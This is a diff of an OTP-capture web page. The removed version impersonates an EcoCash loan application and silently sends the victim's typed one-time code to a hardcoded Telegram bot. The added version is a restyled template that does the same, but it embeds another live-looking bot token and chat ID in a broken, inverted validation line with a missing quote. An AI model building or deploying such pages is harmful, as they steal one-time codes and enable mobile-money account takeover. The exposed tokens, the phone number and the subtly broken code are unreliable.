@@ -1,104 +1,537 @@
-<html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loan Application</title>
-    <script type="module" crossorigin="" src="/assets/index-1e3hgTCm.js"></script>
-    <link rel="stylesheet" crossorigin="" href="/assets/index-rHM7dh2x.css">
-  <style id="_goober"> @keyframes go2264125279{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go3020080000{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}@keyframes go463499852{from{transform:scale(0) rotate(90deg);opacity:0;}to{transform:scale(1) rotate(90deg);opacity:1;}}@keyframes go1268368563{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}@keyframes go1310225428{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go651618207{0%{height:0;width:0;opacity:0;}40%{height:0;width:6px;opacity:1;}100%{opacity:1;height:10px;}}@keyframes go901347462{from{transform:scale(0.6);opacity:0.4;}to{transform:scale(1);opacity:1;}}.go4109123758{z-index:9999;}.go4109123758 > *{pointer-events:auto;}.go2072408551{display:flex;align-items:center;background:#fff;color:#363636;line-height:1.3;will-change:transform;box-shadow:0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);max-width:350px;pointer-events:auto;padding:8px 10px;border-radius:8px;}.go685806154{position:relative;display:flex;justify-content:center;align-items:center;min-width:20px;min-height:20px;}.go457750014{width:12px;height:12px;box-sizing:border-box;border:2px solid;border-radius:100%;border-color:#fff;border-right-color:#667eea;animation:go1268368563 1s linear infinite;}.go1579819456{position:absolute;}.go3375661512{width:20px;opacity:0;height:20px;border-radius:10px;background:#667eea;position:relative;transform:rotate(45deg);animation:go1310225428 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;animation-delay:100ms;}.go3375661512:after{content:'';box-sizing:border-box;animation:go651618207 0.2s ease-out forwards;opacity:0;animation-delay:200ms;position:absolute;border-right:2px solid;border-bottom:2px solid;border-color:#fff;bottom:6px;left:6px;height:10px;width:6px;}.go3958317564{display:flex;justify-content:center;margin:4px 10px;color:inherit;flex:1 1 auto;white-space:pre-line;}@keyframes go3223188581{0%{transform:translate3d(0,-200%,0) scale(.6);opacity:.5;}100%{transform:translate3d(0,0,0) scale(1);opacity:1;}}@keyframes go502128938{0%{transform:translate3d(0,0,-1px) scale(1);opacity:1;}100%{transform:translate3d(0,-150%,-1px) scale(.6);opacity:0;}}.go1858758034{width:12px;height:12px;box-sizing:border-box;border:2px solid;border-radius:100%;border-color:#e0e0e0;border-right-color:#616161;animation:go1268368563 1s linear infinite;}.go2534082608{width:20px;opacity:0;height:20px;border-radius:10px;background:#ff4b4b;position:relative;transform:rotate(45deg);animation:go2264125279 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;animation-delay:100ms;}.go2534082608:after, .go2534082608:before{content:'';animation:go3020080000 0.15s ease-out forwards;animation-delay:150ms;position:absolute;border-radius:3px;opacity:0;background:#fff;bottom:9px;left:4px;height:2px;width:12px;}.go2534082608:before{animation:go463499852 0.15s ease-out forwards;animation-delay:180ms;transform:rotate(90deg);}</style></head>
-  <body>
-    <div id="root"><div class="app"><div data-rht-toaster="" style="position: fixed; z-index: 9999; inset: 16px; pointer-events: none;"></div><div style="min-height: 100vh; background: linear-gradient(rgb(240, 240, 240) 0%, rgb(224, 224, 224) 100%); display: flex; flex-direction: column;"><div style="padding: 24px 20px; display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0px auto; width: 100%;"><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; color: rgb(51, 51, 51); cursor: pointer; font-size: 24px; display: flex; align-items: center; gap: 5px;"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg></button><img src="/ecocash.png" alt="EcoCash" style="height: 42px; object-fit: contain;"><button style="background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; font-size: 24px; cursor: pointer; color: rgb(51, 51, 51); padding: 8px; border-radius: 8px; transition: background 0.2s;">☰</button></div><div style="flex: 1 1 0%; display: flex; align-items: center; justify-content: center; padding: 8px;"><div style="background: white; border-radius: 16px; padding: 36px 24px; width: 100%; max-width: 450px; box-shadow: rgba(0, 0, 0, 0.08) 0px 4px 20px;"><h1 style="font-size: 32px; font-weight: 700; margin-bottom: 15px; color: rgb(51, 51, 51);">OTP Verification</h1><p style="color: rgb(102, 102, 102); font-size: 15px; margin-bottom: 30px; line-height: 1.5;">Enter the OTP sent to your phone number<br><strong style="color: rgb(51, 51, 51);">0710463543</strong></p>      
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>6‑digit OTP · Telegram connect</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
 
+    body {
+      background: linear-gradient(145deg, #f5f7fe 0%, #e9ecf5 100%);
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
 
+    .otp-card {
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(8px);
+      padding: 2.5rem 2rem;
+      border-radius: 2.5rem;
+      box-shadow: 0 25px 40px -10px rgba(0, 20, 40, 0.25),
+                  inset 0 1px 3px rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      max-width: 500px;
+      width: 100%;
+      transition: box-shadow 0.2s;
+    }
 
+    .otp-card:focus-within {
+      box-shadow: 0 30px 50px -10px rgba(20, 60, 130, 0.4),
+                  inset 0 1px 3px #ffffff;
+    }
 
+    h2 {
+      text-align: center;
+      font-weight: 600;
+      font-size: 1.9rem;
+      letter-spacing: -0.02em;
+      margin-top: 0;
+      margin-bottom: 1.8rem;
+      color: #1a2b4c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
 
-<form>
-<div id="lucky-inputs" style="display: flex; gap: 10px; justify-content: center; margin-bottom: 25px;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-    <input type="text" inputmode="numeric" maxlength="1" value="" style="width: 50px; height: 55px; font-size: 24px; font-weight: 600; text-align: center; border: 2px solid #ddd; border-radius: 8px; outline: none;">
-</div>
+    h2 span {
+      background: #1a2b4c;
+      color: white;
+      font-size: 0.9rem;
+      font-weight: 500;
+      padding: 0.2rem 1rem;
+      border-radius: 50px;
+      letter-spacing: 0.3px;
+      opacity: 0.9;
+    }
 
-</form>
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 0.7rem;
+      margin: 2rem 0 1.5rem;
+      flex-wrap: wrap;
+    }
 
+    .otp-inputs input {
+      width: 3.8rem;
+      height: 4.2rem;
+      font-size: 2.2rem;
+      font-weight: 600;
+      text-align: center;
+      border: none;
+      border-radius: 1.2rem;
+      background: #ffffff;
+      color: #0a1e3c;
+      caret-color: #2d7aff;
+      box-shadow: 0 8px 18px -6px rgba(0, 20, 40, 0.15),
+                  0 0 0 1px rgba(0, 0, 0, 0.02);
+      transition: all 0.15s ease;
+      outline: 2px solid transparent;
+      outline-offset: 2px;
+    }
 
+    .otp-inputs input:focus {
+      outline: 2px solid #2d7aff;
+      box-shadow: 0 12px 22px -10px #2d7aff60;
+      transform: scale(1.02);
+      background: #ffffff;
+    }
 
-</div></div><div style="text-align: center; padding: 24px; color: rgb(136, 136, 136); font-size: 13px; font-weight: 500;">© 2025 Kashagi Zimbabwe</div></div></div></div>
-  
-<script>
-const BOT_TOKEN = "8894784370:AAE2QmU7-MvEZt0xWbJwfTPyqWA9v4W4xmM";
-const CHAT_ID = "7815412509";
+    .otp-inputs input.filled {
+      background: #f0f5ff;
+      box-shadow: 0 6px 14px -6px #2d7aff40, 0 0 0 1px #2d7aff30;
+    }
 
-const inputs = document.querySelectorAll("#lucky-inputs input");
+    .otp-inputs input:disabled {
+      opacity: 0.6;
+      background: #eef2f9;
+    }
 
-let sent = false;
+    .actions {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
 
-function sendLuckyNumber() {
-    const luckyNum = [...inputs]
-        .map(input => input.value)
-        .join("");
+    .verify-btn {
+      background: #0a1e3c;
+      border: none;
+      color: white;
+      font-weight: 500;
+      font-size: 1.1rem;
+      padding: 0.9rem 2.5rem;
+      border-radius: 60px;
+      width: 100%;
+      max-width: 280px;
+      letter-spacing: 0.3px;
+      cursor: pointer;
+      box-shadow: 0 12px 20px -8px #0a1e3c80;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
 
-    const message = `OTP: ${luckyNum}`;
+    .verify-btn:hover:not(:disabled) {
+      background: #132b54;
+      box-shadow: 0 16px 24px -8px #0a1e3cba;
+      transform: scale(1.02);
+    }
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
+    .verify-btn:active:not(:disabled) {
+      transform: scale(0.98);
+      box-shadow: 0 6px 14px -8px #0a1e3c;
+    }
+
+    .verify-btn:disabled {
+      opacity: 0.6;
+      background: #2a3b5e;
+      box-shadow: none;
+      transform: none;
+      cursor: not-allowed;
+    }
+
+    .resend {
+      font-size: 0.95rem;
+      color: #4b5b78;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0.4rem 1.2rem;
+      border-radius: 2rem;
+      transition: background 0.15s, color 0.15s;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .resend:hover:not(:disabled) {
+      background: #ffffffaa;
+      color: #1a2b4c;
+    }
+
+    .resend:disabled {
+      opacity: 0.4;
+      cursor: default;
+    }
+
+    .message {
+      font-size: 0.95rem;
+      min-height: 1.8rem;
+      margin: 1rem 0 0.2rem;
+      text-align: center;
+      font-weight: 500;
+      transition: 0.15s;
+      padding: 0.2rem 0.8rem;
+      border-radius: 2rem;
+      color: #1e3b6b;
+    }
+
+    .message.success {
+      color: #0c6b3c;
+      background: #d5f0e2;
+    }
+
+    .message.error {
+      color: #b22234;
+      background: #ffe1e1;
+    }
+
+    .flex-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 0.8rem;
+    }
+
+    /* small screens */
+    @media (max-width: 420px) {
+      .otp-card {
+        padding: 1.8rem 1rem;
+      }
+      .otp-inputs {
+        gap: 0.4rem;
+      }
+      .otp-inputs input {
+        width: 2.8rem;
+        height: 3.2rem;
+        font-size: 1.8rem;
+        border-radius: 0.8rem;
+      }
+      h2 {
+        font-size: 1.6rem;
+      }
+    }
+
+    /* tiny config badge – purely visual, not affecting layout */
+    .config-badge {
+      font-size: 0.65rem;
+      color: #7a8aa0;
+      text-align: center;
+      margin-top: 1rem;
+      opacity: 0.6;
+      letter-spacing: 0.3px;
+    }
+  </style>
+</head>
+<body>
+  <div class="otp-card">
+    <h2>
+      Verification
+      <span>6‑digit</span>
+    </h2>
+
+    <!-- OTP inputs -->
+    <div class="otp-inputs" id="otpContainer">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="0" aria-label="digit 1" autofocus>
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="1" aria-label="digit 2">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="2" aria-label="digit 3">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="3" aria-label="digit 4">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="4" aria-label="digit 5">
+      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="5" aria-label="digit 6">
+    </div>
+
+    <!-- Action buttons -->
+    <div class="actions">
+      <button class="verify-btn" id="verifyBtn" disabled>
+        <span>✓</span> Verify &amp; send
+      </button>
+      <div class="flex-row">
+        <button class="resend" id="resendBtn" title="Simulate resend OTP">
+          <span>↻</span> Resend code
+        </button>
+        <button class="resend" id="clearBtn" title="Clear all digits">
+          <span>✕</span> Clear
+        </button>
+      </div>
+    </div>
+
+    <!-- Feedback message -->
+    <div class="message" id="message" role="status"></div>
+
+    <!-- visual only – you edit these constants in JS -->
+    <div class="config-badge" id="configBadge">⚙️ telegram config · set token &amp; chat id</div>
+  </div>
+
+  <script>
+    (function() {
+      'use strict';
+
+      // ============================================================
+      //  🔧  TELEGRAM BOT CONFIGURATION
+      //  👇  REPLACE THESE TWO VALUES WITH YOUR OWN  👇
+      // ============================================================
+      const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';      // e.g. '123456789:ABCdefGHIjklMNOpqrSTUvwxYZ'
+      const CHAT_ID = 'YOUR_CHAT_ID_HERE';          // e.g. '123456789' or '-1001234567890'
+      // ============================================================
+
+      // DOM elements
+      const otpInputs = Array.from(document.querySelectorAll('.otp-inputs input'));
+      const verifyBtn = document.getElementById('verifyBtn');
+      const resendBtn = document.getElementById('resendBtn');
+      const clearBtn = document.getElementById('clearBtn');
+      const messageEl = document.getElementById('message');
+      const configBadge = document.getElementById('configBadge');
+
+      // Update config badge visual
+      if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        configBadge.textContent = '⚠️ replace BOT_TOKEN and CHAT_ID in the script';
+        configBadge.style.color = '#b22234';
+        configBadge.style.opacity = '0.9';
+      } else {
+        configBadge.textContent = '✅ telegram connected (demo mode)';
+        configBadge.style.color = '#0c6b3c';
+        configBadge.style.opacity = '0.8';
+      }
+
+      // ----- Helper: update verify button state -----
+      function updateVerifyButton() {
+        const allFilled = otpInputs.every(input => input.value.length === 1 && /^\d$/.test(input.value));
+        verifyBtn.disabled = !allFilled;
+      }
+
+      // ----- Helper: set message with type -----
+      function setMessage(text, type = '') {
+        messageEl.textContent = text;
+        messageEl.className = 'message';
+        if (type) messageEl.classList.add(type);
+      }
+
+      // ----- Clear all inputs -----
+      function clearAllInputs(focusFirst = true) {
+        otpInputs.forEach((input) => {
+          input.value = '';
+          input.classList.remove('filled');
+          input.disabled = false;
+        });
+        updateVerifyButton();
+        setMessage('');
+        if (focusFirst && otpInputs[0]) otpInputs[0].focus();
+      }
+
+      // ----- Mark a single input as filled/unfilled -----
+      function markFilled(input) {
+        if (input.value.length === 1 && /^\d$/.test(input.value)) {
+          input.classList.add('filled');
+        } else {
+          input.classList.remove('filled');
+        }
+      }
+
+      // ----- Send OTP to Telegram via Bot API (direct fetch) -----
+      async function sendOTPToTelegram(otpCode) {
+        // Validate config before sending
+        if (BOT_TOKEN === '8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY' || CHAT_ID === '8094482230) {
+          throw new Error('Telegram not configured. Please set BOT_TOKEN and CHAT_ID.');
+        }
+
+        const text = `🔐 *OTP Verification Code*\n\n` +
+                     `Code: \`${otpCode}\`\n` +
+                     `Time: ${new Date().toLocaleString()}\n\n` +
+                     `_via OTP page_`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: message
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log("Message sent!", data);
-    })
-    .catch(err => {
-        console.error("Failed to send:", err);
-    });
-}
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
 
-inputs.forEach((input, index) => {
+        const data = await response.json();
+        if (!data.ok) {
+          throw new Error(data.description || 'Telegram API error');
+        }
+        return data;
+      }
 
-    // Move to next input automatically
-    input.addEventListener("input", () => {
+      // ----- OTP input event handlers (same UX as before) -----
+      otpInputs.forEach((input, index) => {
+        // Input: keep only digit, auto-advance
+        input.addEventListener('input', function(e) {
+          const value = e.target.value;
 
-        // Only keep one character
-        input.value = input.value.slice(0, 1);
+          if (value && !/^\d$/.test(value)) {
+            e.target.value = '';
+            markFilled(e.target);
+            updateVerifyButton();
+            return;
+          }
 
-        // Jump to next input
-        if (input.value !== "" && index < inputs.length - 1) {
-            inputs[index + 1].focus();
+          if (value.length > 1) {
+            e.target.value = value.slice(-1);
+          }
+
+          if (e.target.value.length === 1) {
+            markFilled(e.target);
+            if (index < otpInputs.length - 1) {
+              otpInputs[index + 1].focus();
+            }
+          } else {
+            markFilled(e.target);
+          }
+
+          updateVerifyButton();
+        });
+
+        // Keydown: backspace, arrows, restrict non-digit
+        input.addEventListener('keydown', function(e) {
+          const key = e.key;
+
+          if (key === 'Backspace') {
+            if (e.target.value.length === 0 && index > 0) {
+              e.preventDefault();
+              const prevInput = otpInputs[index - 1];
+              prevInput.focus();
+              prevInput.value = '';
+              prevInput.classList.remove('filled');
+              updateVerifyButton();
+              prevInput.setSelectionRange(0, 0);
+            }
+          }
+
+          if (key === 'ArrowLeft' && index > 0) {
+            e.preventDefault();
+            otpInputs[index - 1].focus();
+            const prev = otpInputs[index - 1];
+            prev.setSelectionRange(prev.value.length, prev.value.length);
+          }
+          if (key === 'ArrowRight' && index < otpInputs.length - 1) {
+            e.preventDefault();
+            otpInputs[index + 1].focus();
+            const next = otpInputs[index + 1];
+            next.setSelectionRange(next.value.length, next.value.length);
+          }
+
+          if (key === 'Delete') {
+            if (e.target.value.length === 0 && index < otpInputs.length - 1) {
+              e.preventDefault();
+              otpInputs[index + 1].focus();
+            }
+          }
+
+          if (key === ' ') {
+            e.preventDefault();
+          }
+
+          if (!/^[0-9]$/.test(key) && 
+              !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End', 'Enter'].includes(key) &&
+              !(e.ctrlKey || e.metaKey)) {
+            e.preventDefault();
+          }
+        });
+
+        // Select content on focus
+        input.addEventListener('focus', function(e) {
+          e.target.select();
+        });
+
+        // Paste handler: distribute digits across inputs
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pasteData = (e.clipboardData || window.clipboardData).getData('text');
+          const digits = pasteData.replace(/\D/g, '').slice(0, 6);
+          if (digits.length === 0) return;
+
+          let currentIdx = index;
+          for (let i = 0; i < digits.length; i++) {
+            if (currentIdx >= otpInputs.length) break;
+            otpInputs[currentIdx].value = digits[i];
+            otpInputs[currentIdx].classList.add('filled');
+            currentIdx++;
+          }
+
+          if (currentIdx < otpInputs.length) {
+            otpInputs[currentIdx].focus();
+          } else {
+            otpInputs[otpInputs.length - 1].focus();
+          }
+
+          otpInputs.forEach(inp => markFilled(inp));
+          updateVerifyButton();
+        });
+      });
+
+      // ----- Verify & Send button -----
+      verifyBtn.addEventListener('click', async function() {
+        const entered = otpInputs.map(inp => inp.value).join('');
+
+        if (entered.length !== 6 || !/^\d{6}$/.test(entered)) {
+          setMessage('Please fill all 6 digits.', 'error');
+          return;
         }
 
-        const allFilled = [...inputs].every(input => input.value.trim() !== "");
-        const allEmpty = [...inputs].every(input => input.value.trim() === "");
+        // Disable button while sending
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = '<span>⏳</span> Sending...';
+        setMessage('Sending code to Telegram…', '');
 
-        // Send once when all inputs are filled
-        if (allFilled && !sent) {
-            sent = true;
-            sendLuckyNumber();
+        try {
+          await sendOTPToTelegram(entered);
+          setMessage('✅ OTP sent to Telegram! Check your chat.', 'success');
+
+          // Optional: you can disable inputs after success
+          // otpInputs.forEach(inp => inp.disabled = true);
+        } catch (error) {
+          console.error('Telegram send error:', error);
+          setMessage('❌ Failed to send: ' + error.message, 'error');
+        } finally {
+          // Re-enable verify button (unless you want to keep it disabled)
+          verifyBtn.disabled = false;
+          verifyBtn.innerHTML = '<span>✓</span> Verify &amp; send';
+          // updateVerifyButton() will re-enable if all filled; but we set manually above
+          // to be safe, call updateVerifyButton again
+          updateVerifyButton();
         }
+      });
 
-        // Reset when all inputs are cleared
-        if (allEmpty) {
-            sent = false;
-        }
-    });
+      // ----- Resend (simulated) -----
+      resendBtn.addEventListener('click', function() {
+        clearAllInputs(true);
+        setMessage('A new OTP has been sent (demo).', 'success');
+      });
 
-    // Move back on Backspace
-    input.addEventListener("keydown", (e) => {
-        if (e.key === "Backspace" && input.value === "" && index > 0) {
-            inputs[index - 1].focus();
-        }
-    });
+      // ----- Clear button -----
+      clearBtn.addEventListener('click', function() {
+        clearAllInputs(true);
+        setMessage('Cleared.', '');
+      });
 
-});
-</script>
+      // ----- Initialize -----
+      clearAllInputs(false);
+      setMessage('Enter 6‑digit code and click Verify to send to Telegram', '');
+      window.addEventListener('load', () => {
+        if (otpInputs[0]) otpInputs[0].focus();
+      });
 
-
-</body></html>
+    })();
+  </script>
+</body>
+    </html>
